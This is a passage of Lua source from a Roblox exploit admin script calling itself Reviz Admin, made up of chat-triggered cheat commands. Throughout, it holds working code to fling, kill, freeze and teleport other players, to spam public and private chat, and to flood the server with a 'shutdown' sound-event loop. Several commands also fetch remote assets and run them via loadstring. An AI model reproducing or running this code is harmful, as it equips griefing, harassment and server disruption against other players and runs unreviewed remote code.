    end
    if string.sub(msg, 1, 10) == (prefix.."freefall ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 11))) do
            local NOW = lplayer.Character.HumanoidRootPart.CFrame
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.2)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.6)
            lplayer.Character.HumanoidRootPart.CFrame = NOW
            wait(0.6)
            lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,50000,0)
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."trail ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
            traill = true
            trlplr = v
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."untrail") then
        traill = false
    end
    if string.sub(msg, 1, 7) == (prefix.."orbit ") then
        if string.sub(msg, 8) == "all" or string.sub(msg, 8) == "others" or string.sub(msg, 8) == "me" then
            lplayer.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame
        else
            for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
                local o = Instance.new("RocketPropulsion")
                o.Parent = lplayer.Character.HumanoidRootPart
                o.Name = "Orbit"
                o.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
                o:Fire()
                noclip = true
            end
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."unorbit") then
        lplayer.Character.HumanoidRootPart.Orbit:Destroy()
        noclip = false
    end
    if string.sub(msg, 1, 7) == (prefix.."fling ") then
        if string.sub(msg, 8) == "all" or string.sub(msg, 8) == "others" or string.sub(msg, 8) == "me" then
            lplayer.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame
        else
            for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
                local y = Instance.new("RocketPropulsion")
                y.Parent = lplayer.Character.HumanoidRootPart
                y.CartoonFactor = 1
                y.MaxThrust = 800000
                y.MaxSpeed = 1000
                y.ThrustP = 200000
                y.Name = "Fling"
                game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
                y.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
                y:Fire()
                noclip = true
            end
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."unfling") then
        noclip = false
        lplayer.Character.HumanoidRootPart.Fling:Destroy()
        game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
        wait(0.4)
        lplayer.Character.HumanoidRootPart.Fling:Destroy()
    end
    if string.sub(msg, 1, 8) == (prefix.."fecheck") then
        if game:GetService("Workspace").FilteringEnabled == true then
            warn("FE is Enabled (Filtering Enabled)")
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "FE is Enabled";
                Text = "Filtering Enabled. Enjoy using Reviz Admin!";
            })
        else
            warn("FE is Disabled (Filtering Disabled) Consider using a different admin script.")
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "FE is Disabled";
                Text = "Filtering Disabled. Consider using a different admin script.";
            })
        end
    end
    if string.sub(msg, 1, 6) == (prefix.."void ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.2)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.6)
            lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999999999,0,999999999999999)
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."noclip") then
        noclip = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Noclip enabled";
        Text = "Type ;clip to disable";
        })
    end
    if string.sub(msg, 1, 5) == (prefix.."clip") then
        noclip = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Noclip disabled";
        Text = "Type ;noclip to enable";
        })
    end
    if string.sub(msg, 1, 7) == (prefix.."speed ") then
        lplayer.Character.Humanoid.WalkSpeed = (string.sub(msg, 8))
    end
    if string.sub(msg, 1, 4) == (prefix.."ws ") then
        lplayer.Character.Humanoid.WalkSpeed = (string.sub(msg, 5))
    end
    if string.sub(msg, 1, 11) == (prefix.."hipheight ") then
        lplayer.Character.Humanoid.HipHeight = (string.sub(msg, 12))
    end
    if string.sub(msg, 1, 4) == (prefix.."hh ") then
        lplayer.Character.Humanoid.HipHeight = (string.sub(msg, 5))
    end
    if string.sub(msg, 1, 11) == (prefix.."jumppower ") then
        lplayer.Character.Humanoid.JumpPower = (string.sub(msg, 12))
    end
    if string.sub(msg, 1, 4) == (prefix.."jp ") then
        lplayer.Character.Humanoid.JumpPower = (string.sub(msg, 5))
    end
    if string.sub(msg, 1, 8) == (prefix.."default") then
        lplayer.Character.Humanoid.JumpPower = 50
        lplayer.Character.Humanoid.WalkSpeed = 16
        lplayer.Character.Humanoid.HipHeight = 0
    end
    if string.sub(msg, 1, 7) == (prefix.."annoy ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
            annoying = true
            annplr = v
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."unannoy") then
        annoying = false
    end
    if string.sub(msg, 1, 10) == (prefix.."headwalk ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 11))) do
            hwalk = true
            hdwplr = v
        end
    end
    if string.sub(msg, 1, 11) == (prefix.."unheadwalk") then
        hwalk = false
    end
    if string.sub(msg, 1, 8) == (prefix.."nolimbs") then
        lplayer.Character["Left Leg"]:Destroy()
        lplayer.Character["Left Arm"]:Destroy()
        lplayer.Character["Right Leg"]:Destroy()
        lplayer.Character["Right Arm"]:Destroy()
    end
    if string.sub(msg, 1, 4) == (prefix.."god") then
        lplayer.Character.Humanoid.Name = 1
        local l = lplayer.Character["1"]:Clone()
        l.Parent = lplayer.Character
        l.Name = "Humanoid"
        wait(0.1)
        lplayer.Character["1"]:Destroy()
        game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
        lplayer.Character.Animate.Disabled = true
        wait(0.1)
        lplayer.Character.Animate.Disabled = false
        lplayer.Character.Humanoid.DisplayDistanceType = "None"
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "FE Godmode enabled";
        Text = "Use ;grespawn or ;respawn to remove";
        })
    end
    if string.sub(msg, 1, 9) == (prefix.."drophats") then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                v.Parent = workspace
            end
        end
    end
    if string.sub(msg, 1, 9) == (prefix.."droptool") then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Tool")) then
                v.Parent = workspace
            end
        end
    end
    if string.sub(msg, 1, 10) == (prefix.."loopdhats") then
        droppinghats = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Loop Drop Enabled";
        Text = "Type ;unloopdhats to disable";
        })
    end
    if string.sub(msg, 1, 12) == (prefix.."unloopdhats") then
        droppinghats = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Loop Drop Disabled";
        Text = "Type ;loopdhats to enable.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."loopdtool") then
        droppingtools = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Loop Drop Enabled";
        Text = "Type ;unloopdtool to disable";
        })
    end
    if string.sub(msg, 1, 12) == (prefix.."unloopdtool") then
        droppingtools = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Loop Drop Disabled";
        Text = "Type ;loopdtool to enable.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."invisible") then -- Credit to Timeless
        Local = game:GetService('Players').LocalPlayer
        Char  = Local.Character
        touched,tpdback = false, false
        box = Instance.new('Part',workspace)
        box.Anchored = true
        box.CanCollide = true
        box.Size = Vector3.new(10,1,10)
        box.Position = Vector3.new(0,10000,0)
        box.Touched:connect(function(part)
            if (part.Parent.Name == Local.Name) then
                if touched == false then
                    touched = true
                    function apply()
                        if script.Disabled ~= true then
                            no = Char.HumanoidRootPart:Clone()
                            wait(.25)
                            Char.HumanoidRootPart:Destroy()
                            no.Parent = Char
                            Char:MoveTo(loc)
                            touched = false
                        end end
                    if Char then
                        apply()
                    end
                end
            end
        end)
        repeat wait() until Char
        loc = Char.HumanoidRootPart.Position
        Char:MoveTo(box.Position + Vector3.new(0,.5,0))
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Invisibility enabled!";
        Text = "Reset or use ;respawn to remove.";
        })
    end
    if string.sub(msg, 1, 6) == (prefix.."view ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
            if game:GetService("Players")[v.Name].Character.Humanoid then
                game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Humanoid
            else
                game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
            end
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."unview") then
        if lplayer.Character.Humanoid then
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
        else
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
        end
    end
    if string.sub(msg, 1, 6) == (prefix.."goto ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
        end
    end
    if string.sub(msg, 1, 4) == (prefix.."fly") then
    repeat wait() until lplayer and lplayer.Character and lplayer.Character:FindFirstChild('HumanoidRootPart') and lplayer.Character:FindFirstChild('Humanoid')
    repeat wait() until Mouse
   
    local T = lplayer.Character.HumanoidRootPart
    local CONTROL = {F = 0, B = 0, L = 0, R = 0}
    local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
    local SPEED = speedget
   
    local function fly()
        flying = true
        local BG = Instance.new('BodyGyro', T)
        local BV = Instance.new('BodyVelocity', T)
        BG.P = 9e4
        BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
        BG.cframe = T.CFrame
        BV.velocity = Vector3.new(0, 0.1, 0)
        BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
        spawn(function()
        repeat wait()
        lplayer.Character.Humanoid.PlatformStand = true
        if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
        SPEED = 50
        elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
        SPEED = 0
        end
        if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
        BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
        lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
        elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
        BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
        else
        BV.velocity = Vector3.new(0, 0.1, 0)
        end
        BG.cframe = workspace.CurrentCamera.CoordinateFrame
                until not flying
                CONTROL = {F = 0, B = 0, L = 0, R = 0}
                lCONTROL = {F = 0, B = 0, L = 0, R = 0}
                SPEED = 0
                BG:destroy()
                BV:destroy()
                lplayer.Character.Humanoid.PlatformStand = false
            end)
        end
    Mouse.KeyDown:connect(function(KEY)
        if KEY:lower() == 'w' then
            CONTROL.F = speedfly
        elseif KEY:lower() == 's' then
            CONTROL.B = -speedfly
        elseif KEY:lower() == 'a' then
            CONTROL.L = -speedfly
        elseif KEY:lower() == 'd' then
            CONTROL.R = speedfly
        end
    end)
    Mouse.KeyUp:connect(function(KEY)
        if KEY:lower() == 'w' then
            CONTROL.F = 0
        elseif KEY:lower() == 's' then
            CONTROL.B = 0
        elseif KEY:lower() == 'a' then
            CONTROL.L = 0
        elseif KEY:lower() == 'd' then
            CONTROL.R = 0
        end
    end)
    fly()
    end
    if string.sub(msg, 1, 6) == (prefix.."unfly") then
        flying = false
        lplayer.Character.Humanoid.PlatformStand = false
    end
    if string.sub(msg, 1, 6) == (prefix.."chat ") then
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer((string.sub(msg, 7)), "All")
    end
    if string.sub(msg, 1, 6) == (prefix.."spam ") then
        spamtext = (string.sub(msg, 7))
        spamming = true
    end
    if string.sub(msg, 1, 7) == (prefix.."unspam") then
        spamming = false
    end
    if string.sub(msg, 1, 10) == (prefix.."spamwait ") then
        spamdelay = (string.sub(msg, 11))
    end
    if string.sub(msg, 1, 8) == (prefix.."pmspam ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
            pmspammed = v.Name
            spammingpm = true
        end
    end
    if string.sub(msg, 1, 9) == (prefix.."unpmspam") then
        spammingpm = false
    end
    if string.sub(msg, 1, 9) == (prefix.."cfreeze ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 10))) do
            v.Character["Left Leg"].Anchored = true
            v.Character["Left Arm"].Anchored = true
            v.Character["Right Leg"].Anchored = true
            v.Character["Right Arm"].Anchored = true
            v.Character.Torso.Anchored = true
            v.Character.Head.Anchored = true
        end
    end
    if string.sub(msg, 1, 11) == (prefix.."uncfreeze ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 12))) do
            v.Character["Left Leg"].Anchored = false
            v.Character["Left Arm"].Anchored = false
            v.Character["Right Leg"].Anchored = false
            v.Character["Right Arm"].Anchored = false
            v.Character.Torso.Anchored = false
            v.Character.Head.Anchored = false
        end
    end
    if string.sub(msg, 1, 9) == (prefix.."unlockws") then
        local a = game:GetService("Workspace"):getChildren()
        for i = 1, #a do
            if a[i].className == "Part" then
                a[i].Locked = false
            elseif a[i].className == "Model" then
                local r = a[i]:getChildren()
                for i = 1, #r do
                    if r[i].className == "Part" then
                    r[i].Locked = false
                    end
                end
            end
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Success!";
        Text = "Workspace unlocked. Use ;lockws to lock.";
        })
    end
    if string.sub(msg, 1, 7) == (prefix.."lockws") then
        local a = game:GetService("Workspace"):getChildren()
        for i = 1, #a do
            if a[i].className == "Part" then
                a[i].Locked = true
            elseif a[i].className == "Model" then
                local r = a[i]:getChildren()
                for i = 1, #r do
                    if r[i].className == "Part" then
                    r[i].Locked = true
                    end
                end
            end
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."btools") then
        local Clone_T = Instance.new("HopperBin",lplayer.Backpack)
        Clone_T.BinType = "Clone"
        local Destruct = Instance.new("HopperBin",lplayer.Backpack)
        Destruct.BinType = "Hammer"
        local Hold_T = Instance.new("HopperBin",lplayer.Backpack)
        Hold_T.BinType = "Grab"
    end
    if string.sub(msg, 1, 7) == (prefix.."pstand") then
        lplayer.Character.Humanoid.PlatformStand = true
    end
    if string.sub(msg, 1, 9) == (prefix.."unpstand") then
        lplayer.Character.Humanoid.PlatformStand = false
    end
    if string.sub(msg, 1, 10) == (prefix.."blockhead") then
        lplayer.Character.Head.Mesh:Destroy()
    end
    if string.sub(msg, 1, 4) == (prefix.."sit") then
        lplayer.Character.Humanoid.Sit = true
    end
    if string.sub(msg, 1, 10) == (prefix.."bringobj ") then
        local function bringobjw()
        for i,obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
        if obj.Name == (string.sub(msg, 11)) then
        obj.CFrame = lplayer.Character.HumanoidRootPart.CFrame
        obj.CanCollide = false
        obj.Transparency = 0.7
        wait()
        obj.CFrame = lplayer.Character["Left Leg"].CFrame
        wait()
        obj.CFrame = lplayer.Character["Right Leg"].CFrame
        wait()
        obj.CFrame = lplayer.Character["Head"].CFrame
        end
        end
        end
        while wait() do
            bringobjw()
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "BringObj";
        Text = "BringObj enabled.";
        })
    end
    if string.sub(msg, 1, 7) == (prefix.."wsvis ") then
        vis = (string.sub(msg, 8))
        local a = game:GetService("Workspace"):GetDescendants()
        for i = 1, #a do
            if a[i].className == "Part" then
                a[i].Transparency = vis
            elseif a[i].className == "Model" then
                local r = a[i]:getChildren()
                for i = 1, #r do
                    if r[i].className == "Part" then
                    r[i].Transparency = vis
                    end
                end
            end
        end
    end
    if string.sub(msg, 1, 11) == (prefix.."hypertotal") then
        loadstring(game:GetObjects("rbxassetid://1255063809")[1].Source)()
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Success!";
        Text = "HyperTotal GUI Loaded!";
        })
    end
    if string.sub(msg, 1, 5) == (prefix.."cmds") then
        CMDSFRAME.Visible = true
    end
    if string.sub(msg, 1, 10) == (prefix.."rmeshhats") then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                v.Handle.Mesh:Destroy()
            end
        end
    end
    if string.sub(msg, 1, 10) == (prefix.."blockhats") then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                v.Handle.Mesh:Destroy()
            end
        end
    end
    if string.sub(msg, 1, 10) == (prefix.."rmeshtool") then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Tool")) then
                v.Handle.Mesh:Destroy()
            end
        end
    end
    if string.sub(msg, 1, 10) == (prefix.."blocktool") then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Tool")) then
                v.Handle.Mesh:Destroy()
            end
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."spinner") then
        local p = Instance.new("RocketPropulsion")
        p.Parent = lplayer.Character.HumanoidRootPart
        p.Name = "Spinner"
        p.Target = lplayer.Character["Left Arm"]
        p:Fire()
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Spinner enabled";
        Text = "Type ;nospinner to disable.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."nospinner") then
        lplayer.Character.HumanoidRootPart.Spinner:Destroy()
    end
    if string.sub(msg, 1, 7) == (prefix.."reachd") then
        for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
            if v:isA("Tool") then
                local a = Instance.new("SelectionBox",v.Handle)
                a.Adornee = v.Handle
                v.Handle.Size = Vector3.new(0.5,0.5,60)
                v.GripPos = Vector3.new(0,0,0)
                lplayer.Character.Humanoid:UnequipTools()
            end
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Reach applied!";
        Text = "Applied to equipped sword. Use ;noreach to disable.";
        })
    end
    if string.sub(msg, 1, 7) == (prefix.."reach ") then
        for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
            if v:isA("Tool") then
                handleSize = v.Handle.Size
                wait()
                local a = Instance.new("SelectionBox",v.Handle)
                a.Name = "a"
                a.Adornee = v.Handle
                v.Handle.Size = Vector3.new(0.5,0.5,(string.sub(msg, 8)))
                v.GripPos = Vector3.new(0,0,0)
                lplayer.Character.Humanoid:UnequipTools()
            end
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Reach applied!";
        Text = "Applied to equipped sword. Use ;noreach to disable.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."noreach") then
        for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
            if v:isA("Tool") then
                v.Handle.a:Destroy()
                v.Handle.Size = handleSize
            end
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Reach removed!";
        Text = "Removed reach from equipped sword.";
        })
    end
    if string.sub(msg, 1, 7) == (prefix.."rkill ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 8)))do
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            wait(0.1)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.2)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.5)
            lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000,10,-100000))
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."tp me ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."cbring ") then
        if (string.sub(msg, 9)) == "all" or (string.sub(msg, 9)) == "All" or (string.sub(msg, 9)) == "ALL" then
            cbringall = true
        else
            for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
                brplr = v.Name
            end
        end
        cbring = true
    end
    if string.sub(msg, 1, 9) == (prefix.."uncbring") then
        cbring = false
        cbringall = false
    end
    if string.sub(msg, 1, 6) == (prefix.."swap ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
            local NOWPLR = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            local NOW = lplayer.Character.HumanoidRootPart.CFrame
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            local function tp(player,player2)
            local char1,char2=player.Character,player2.Character
            if char1 and char2 then
            char1:MoveTo(char2.Head.Position)
            end
            end
            wait(0.1)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.2)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.5)
            lplayer.Character.HumanoidRootPart.CFrame = NOW
            wait(0.6)
            tp(lplayer, game:GetService("Players")[v.Name])
            wait(0.4)
            lplayer.Character.HumanoidRootPart.CFrame = NOWPLR
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."glitch ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
            wait(0.3)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
            wait(0.4)
            b = Instance.new("BodyForce")
            b.Parent = lplayer.Character.HumanoidRootPart
            b.Name = "Glitch"
            b.Force = Vector3.new(100000000,5000,0)
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 9) == (prefix.."unglitch") then
        lplayer.Character.HumanoidRootPart.Glitch:Destroy()
        lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(10000,0,10000)
        b = Instance.new("BodyForce")
        b.Parent = lplayer.Character.HumanoidRootPart
        b.Name = "unGlitch"
        b.Force = Vector3.new(0,-5000000,0)
        wait(2)
        lplayer.Character.HumanoidRootPart.unGlitch:Destroy()
    end
    if string.sub(msg, 1, 9) == (prefix.."grespawn") then
        lplayer.Character.Humanoid.Health = 0
        wait(1)
        lplayer.Character.Head.CFrame = CFrame.new(1000000,0,1000000)
        lplayer.Character.Torso.CFrame = CFrame.new(1000000,0,1000000)
    end
    if string.sub(msg, 1, 9) == (prefix.."explorer") then
        loadstring(game:GetObjects("rbxassetid://492005721")[1].Source)()
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Success!";
        Text = "DEX Explorer has loaded.";
        })
    end
    if string.sub(msg, 1, 6) == (prefix.."anim ") then
        local Anim = Instance.new("Animation")
        Anim.AnimationId = "rbxassetid://"..(string.sub(msg, 7))
        local track = lplayer.Character.Humanoid:LoadAnimation(Anim)
        track:Play(.1, 1, 1)
    end
    if string.sub(msg, 1, 8) == (prefix.."animgui") then
        loadstring(game:GetObjects("rbxassetid://1202558084")[1].Source)()
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Success!";
        Text = "Energize Animations GUI has loaded.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."savepos") then
        saved = lplayer.Character.HumanoidRootPart.CFrame
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Position Saved";
        Text = "Use ;loadpos to return to saved position.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."loadpos") then
        lplayer.Character.HumanoidRootPart.CFrame = saved
    end
    if string.sub(msg, 1, 6) == (prefix.."bang ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
            local Anim2 = Instance.new("Animation")
            Anim2.AnimationId = "rbxassetid://148840371"
            local track2 = lplayer.Character.Humanoid:LoadAnimation(Anim2)
            track2:Play(.1, 1, 1)
            bplrr = v.Name
            banpl = true
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."unbang") then
        banpl = false
    end
    if string.sub(msg, 1, 10) == (prefix.."bringmod ") then
        local function bringmodw()
        for i,obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
        if obj.Name == (string.sub(msg, 11)) then
        for i,ch in pairs(obj:GetDescendants()) do
        if (ch:IsA("BasePart")) then
        ch.CFrame = lplayer.Character.HumanoidRootPart.CFrame
        ch.CanCollide = false
        ch.Transparency = 0.7
        wait()
        ch.CFrame = lplayer.Character["Left Leg"].CFrame
        wait()
        ch.CFrame = lplayer.Character["Right Leg"].CFrame
        wait()
        ch.CFrame = lplayer.Character["Head"].CFrame
        end
        end
        end
        end
        end
        while wait() do
            bringmodw()
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "BringMod";
        Text = "BringMod enabled.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."respawn") then
        local mod = Instance.new('Model', workspace) mod.Name = 're '..lplayer.Name
        local hum = Instance.new('Humanoid', mod)
        local ins = Instance.new('Part', mod) ins.Name = 'Torso' ins.CanCollide = false ins.Transparency = 1
        lplayer.Character = mod
    end
    if string.sub(msg, 1, 9) == (prefix.."shutdown") then
        game:GetService'RunService'.Stepped:Connect(function()
        pcall(function()
            for i,v in pairs(game:GetService'Players':GetPlayers()) do
                if v.Character ~= nil and v.Character:FindFirstChild'Head' then
                    for _,x in pairs(v.Character.Head:GetChildren()) do
                        if x:IsA'Sound' then x.Playing = true x.CharacterSoundEvent:FireServer(true, true) end
                    end
                end
            end
        end)
        end)
